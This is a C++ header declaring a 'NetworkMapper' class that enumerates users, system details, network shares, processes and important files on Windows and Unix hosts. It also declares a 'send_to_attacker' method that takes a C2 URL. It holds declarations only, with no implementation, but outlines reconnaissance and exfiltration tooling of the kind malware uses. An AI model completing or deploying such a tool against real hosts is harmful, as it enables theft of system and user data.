#ifndef NETWORK_MAPPER_H
#define NETWORK_MAPPER_H

#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <ctime>
#include <filesystem>

#ifdef _WIN32
#include <windows.h>
#include <lm.h>
#include <winnetwk.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "mpr.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <grp.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/utsname.h>
#endif

namespace fs = std::filesystem;

class NetworkMapper {
private:
    std::string network_log;
    std::ofstream log_file;
    
    void log(const std::string& category, const std::string& info);
    
#ifdef _WIN32
    void enum_windows_users();
    void enum_windows_system_info();
    void enum_network_shares();
    void enum_processes();
    void enum_important_files(const std::string& root);
#else
    void enum_unix_users();
    void enum_unix_system_info();
    void enum_unix_shares();
    void enum_unix_processes();
    void enum_unix_important_files(const std::string& root);
#endif

    bool ends_with(const std::string& str, const std::string& suffix);
    std::string to_lower(const std::string& s);

public:
    NetworkMapper();
    ~NetworkMapper();
    
    void perform_mapping();
    void send_to_attacker(const std::string& c2_url = "");
};

#endif
